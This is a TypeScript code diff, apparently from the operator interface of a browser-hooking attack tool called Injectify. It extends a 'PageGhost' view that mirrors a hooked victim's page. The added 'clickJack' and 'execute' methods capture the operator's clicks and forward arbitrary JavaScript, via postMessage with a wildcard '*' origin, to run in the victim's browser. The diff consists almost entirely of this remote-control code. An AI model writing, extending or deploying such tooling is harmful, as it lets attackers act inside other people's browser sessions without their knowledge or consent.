@@ -116,7 +116,8 @@ document.addEventListener('DOMContentLoaded', () => {
       this.containarize((doc: Document) => {
         window.opener.postMessage({
           type: 'PageGhost',
-          id: decodeURIComponent(window.location.search.substr(1))
+          id: decodeURIComponent(window.location.search.substr(1)),
+          event: 'refresh'
         }, '*')
         this.setConfig()
         // this.fadeCursor(10, 0)
@@ -200,9 +201,11 @@ document.addEventListener('DOMContentLoaded', () => {
       }
       if (data.activeElement) {
         let element = this.getElementById(data.activeElement)
-        console.log(element)
+        console.log(`Focused element ${data.activeElement}`)
         if (element) {
           element.focus()
+          // @ts-ignore
+          if (element.select) element.select()
         }
       }
       if (data.scroll instanceof Array && typeof data.scroll[0] === 'number' && typeof data.scroll[1] === 'number') {
@@ -246,7 +249,7 @@ document.addEventListener('DOMContentLoaded', () => {
         }
       }
       if (typeof data.cursorStyle === 'string') {
-        console.log(data.cursorStyle)
+        console.log(`Switched cursor to ${data.cursorStyle}`)
         this.pointer.style.backgroundImage = `url('${Cursors(data.cursorStyle)}')`
       }
       if (typeof data.clientX !== 'undefined' && typeof data.clientY !== 'undefined') {
@@ -266,9 +269,41 @@ document.addEventListener('DOMContentLoaded', () => {
       }, 750)
     }
 
+    static clickJack(event: MouseEvent) {
+      event.preventDefault()
+      let id = event.toElement.getAttribute('_-_')
+      console.log(`You clicked on element ${id}`)
+
+      let config = {
+        element: `document.querySelector('[_-_=${JSON.stringify(id)}]')`,
+        type: event.type,
+        cancelable: event.cancelable,
+        detail: event.detail,
+        screenX: event.screenX,
+        screenY: event.screenY,
+        clientX: event.clientX,
+        clientY: event.clientY,
+        ctrlKey: event.ctrlKey,
+        altKey: event.altKey,
+        shiftKey: event.shiftKey,
+        metaKey: event.metaKey,
+        button: event.button,
+      }
+      this.execute(`injectify.module('click', ${JSON.stringify(config)})`)
+    }
+
     static resize(width: number, height: number) {
       this.master.setAttribute('style', `width: ${width}px; height: ${height}px`)
       this.scale()
+    }
+
+    static execute(code: string) {
+      window.opener.postMessage({
+        type: 'PageGhost',
+        id: decodeURIComponent(window.location.search.substr(1)),
+        event: 'execute',
+        data: code
+      }, '*')
     }
 
     static scale() {
@@ -310,6 +345,7 @@ document.addEventListener('DOMContentLoaded', () => {
           // Prevent window hijacking
           (<any>this.container.contentWindow.parent) = null;
           (<any>this.iframe.contentWindow.parent) = null;
+          this.iframe.contentWindow.onclick = this.clickJack.bind(this)
 
           // Reload HTML
           if (this.html) {
